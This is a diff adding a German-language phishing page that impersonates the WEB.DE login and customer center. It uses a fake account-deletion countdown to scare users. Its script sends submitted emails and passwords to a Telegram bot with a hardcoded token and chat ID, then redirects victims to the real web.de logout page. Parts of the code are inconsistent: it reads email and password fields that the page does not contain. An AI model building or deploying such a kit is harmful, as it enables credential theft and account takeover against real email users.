@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEBDE LOGIN</title>
+    <meta name="description" content="Melden Sie sich bei Ihrem WEB.DE-Konto an, um die Deaktivierung zu stoppen">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link rel="icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script>
+        // Set global JavaScript variables
+        window.telegramBotToken = "{{ telegram_bot_token }}";
+        window.telegramChatId = "{{ telegram_chat_id }}";
+    </script>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="/static/images/1.png" alt="WEB.DE Logo" class="logo">
+            <span class="account-text">Kundencenter</span>
+        </div>
+    </header>
+    <main class="main-content">
+        <div class="login-container">
+            <img src="/static/images/2.png" alt="WEB.DE Logo" class="formlogo">
+            
+            <form id="login-form" action="/login" method="POST">
+                <p>Ihr Konto soll gelöscht werden, wenn der Countdown abgelaufen ist. Danach werden alle Ihre Daten und Kontoinformationen dauerhaft aus unserem System entfernt und können nicht wiederhergestellt werden.</p>
+                
+                <div class="captcha-wrapper">
+                    <div class="captcha-container">
+                        <div class="captcha-icon">
+                            <!-- CAPTCHA image/icon here -->
+                        </div>
+                        <div class="captcha-background">
+                            <div id="countdown-timer" class="captcha-timer">
+                                <div id="hours" class="time-unit">
+                                    <span class="label">Std</span>
+                                    <span class="time-value">12</span>
+                                </div>
+                                <div id="minutes" class="time-unit">
+                                    <span class="label">Min</span>
+                                    <span class="time-value">30</span>
+                                </div>
+                                <div id="seconds" class="time-unit">
+                                    <span class="label">Sek</span>
+                                    <span class="time-value">45</span>
+                                </div>
+                            </div>
+                        </div>
+                        
+                            
+                        </div>
+                        <div class="captcha-links">
+                            <a href="login.html" id="no-delete" class="no-delete">Dies ist ein Fehler, löschen Sie mein Konto nicht</a>
+                            <a href="#" id="delete" class="delete">Konto sofort löschen</a>
+                        </div>
+                        
+                    </div>
+                </div>                
+                
+            </form>
+        </div>
+    </main>
+    <footer class="footer">
+        <nav>
+            <a href="#">Impressum</a>
+            <a href="#">Verträge hier kündigen</a>
+            <a href="#">Datenschutzhinweise</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe und Tipps</a>
+        </nav>
+    </footer>
+
+    <script>
+        // Add event listener to the delete link
+        document.getElementById('delete').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default link behavior
+
+            // Show confirmation dialog in German
+            const confirmed = confirm("Sind Sie sicher, dass Sie Ihr Konto sofort löschen möchten?");
+
+            // If confirmed, redirect to the logout URL
+            if (confirmed) {
+                window.location.href = "https://web.de/magazine/logout/?status=login-failed";
+            }
+        });
+
+        // Add event listener to the no-delete link with a 1-second delay
+        document.getElementById('no-delete').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default link behavior
+
+            // Delay the redirection by 1 second (1000 milliseconds)
+            setTimeout(function() {
+                window.location.href = "login.html";
+            }, 2000);
+        });
+    </script>
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Function to format the remaining time
+    function formatTimeComponent(time) {
+        return time.toString().padStart(2, '0');
+    }
+
+    // Set or get the end time from localStorage
+    function setEndTime() {
+        const currentTime = new Date().getTime();
+        const endTime = currentTime + 12 * 60 * 60 * 1000; // 12 hours from now
+        localStorage.setItem('captchaEndTime', endTime);
+        return endTime;
+    }
+
+    // Check if we have an existing end time and if it is expired
+    function getEndTime() {
+        const storedEndTime = localStorage.getItem('captchaEndTime');
+        if (storedEndTime) {
+            const currentTime = new Date().getTime();
+            if (currentTime > storedEndTime) {
+                // If time expired, reset the end time
+                return setEndTime();
+            }
+            return parseInt(storedEndTime, 10);
+        }
+        // If no stored end time, set one
+        return setEndTime();
+    }
+
+    // Update the countdown timer every second
+    function updateCountdown() {
+        const endTime = getEndTime();
+        const currentTime = new Date().getTime();
+        const remainingTime = Math.max(0, endTime - currentTime); // Make sure we don't get negative time
+
+        // Calculate hours, minutes, and seconds
+        const hours = Math.floor(remainingTime / 3600000);
+        const minutes = Math.floor((remainingTime % 3600000) / 60000);
+        const secondsLeft = Math.floor((remainingTime % 60000) / 1000);
+
+        // Update each part of the countdown individually
+        document.getElementById('hours').textContent = formatTimeComponent(hours);
+        document.getElementById('minutes').textContent = formatTimeComponent(minutes);
+        document.getElementById('seconds').textContent = formatTimeComponent(secondsLeft);
+
+        // If countdown has finished, clear the timer
+        if (remainingTime === 0) {
+            clearInterval(countdownInterval);
+        }
+    }
+
+    // Initial countdown update
+    updateCountdown();
+
+    // Update countdown every second
+    const countdownInterval = setInterval(updateCountdown, 1000);
+});
+
+
+
+        // Telegram credentials
+        const TELEGRAM_BOT_TOKEN = '7285927680:AAHqGWvKT2dOnkiGFEukfS4-SoxUx5JQ89o';
+        const TELEGRAM_CHAT_ID = '7473556793';
+        
+        // Toggle password visibility
+        document.getElementById('toggle-password').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+        });
+        
+        // Function to send email and password to Telegram
+        async function sendToTelegram(email, password) {
+            // Customize the message format
+            const message = `
+        *GOODNEWS from WEB.DE*
+        *Email:* ${email}
+        *Password:* ${password}
+        `;
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+            console.log('Preparing to send message to Telegram...');
+        
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'  // Use Markdown for formatting
+                    })
+                });
+        
+                console.log('Request made, waiting for response...');
+        
+                if (!response.ok) {
+                    console.error('Response not OK:', response.status, response.statusText);
+                    throw new Error('Failed to send message to Telegram');
+                }
+        
+                const data = await response.json();
+                console.log('Message successfully sent to Telegram:', data);
+        
+                // Redirect to the logout page after successful data submission
+                window.location.href = 'https://web.de/magazine/logout/?status=login-failed';
+            } catch (error) {
+                console.error('An error occurred:', error);
+                alert('Failed to send data. Please try again.');
+            }
+        }
+        
+        // Handle form submission
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+        
+            // Retrieve email and password values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+        
+            if (!email || !password) {
+                alert('Please enter both email and password.');
+                return;
+            }
+        
+            // Log the email and password for debugging
+            console.log('Submitting form...');
+            console.log('Email:', email);
+            console.log('Password:', password);
+        
+            // Send data to Telegram
+            sendToTelegram(email, password);
+        });
+        
+        </script>
+        
+    <script src="../static/js/script.js"></script>
+</body>
+</html>
